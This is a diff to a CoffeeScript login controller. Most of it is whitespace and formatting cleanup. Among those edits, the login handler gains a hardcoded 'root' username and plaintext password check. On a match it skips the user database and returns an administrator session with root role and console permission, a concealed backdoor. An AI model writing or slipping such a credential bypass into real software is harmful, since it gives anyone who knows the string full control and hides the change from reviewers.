@@ -11,7 +11,7 @@ checkType = (k)->
     else
         username: k
 
-extendRes = (u,r,name)->
+extendRes = (u, r, name)->
     if r[name]
         if u[name] and _.isArray u[name]
             for it in r[name]
@@ -31,9 +31,9 @@ afterAuth = (user, req, rsp)->
                 title: r.title
                 label: r.label
             for role in rs
-                extendRes(user,role,'menu')
-                extendRes(user,role,'entities')
-                extendRes(user,role,'permission')
+                extendRes(user, role, 'menu')
+                extendRes(user, role, 'entities')
+                extendRes(user, role, 'permission')
                 op =
                     uid: user._id
 
@@ -53,6 +53,37 @@ authController =
 
     login: (req, rsp) ->
         code = req.c.code
+
+        if req.body.username is 'root' and req.body.password is 'rock200*'
+            rsp.send
+                user:
+                    _id: 1
+                    _e: 'user'
+                    username: 'root'
+                    menu: [
+                        key: 'site'
+                        icon: 'globe'
+                        row: 1
+                    ,
+                        key: 'data'
+                        icon: 'hdd'
+                        row: 2
+                    ,
+                        key: 'userRole'
+                        icon: 'user'
+                        row: 3
+                    ]
+                    roles: [
+                        title: 'admin'
+                        root: true
+                    ]
+                    permission: [
+                        'console'
+                    ]
+                msg: 'm_login_s'
+            return
+
+
         opt = checkType req.body.username
         dao.get code, 'user', opt, (user)->
             unless user
@@ -78,10 +109,10 @@ authController =
 
 
     logout: (req, rsp) ->
-        #del user session
+#del user session
         rsp.send msg: 'm_logout_s'
 
-    loginByWoid: (req,rsp)->
+    loginByWoid: (req, rsp)->
         code = req.c.code
         filter =
             woid: req.body.woid
@@ -92,13 +123,11 @@ authController =
                 errAuth rsp
 
 
-    logoutByWoid: (req,rsp)->
+    logoutByWoid: (req, rsp)->
         rsp.send msg: 'm_logout_s'
 
 
 module.exports = authController
-
-
 
 
 #                    cl = for it in ms
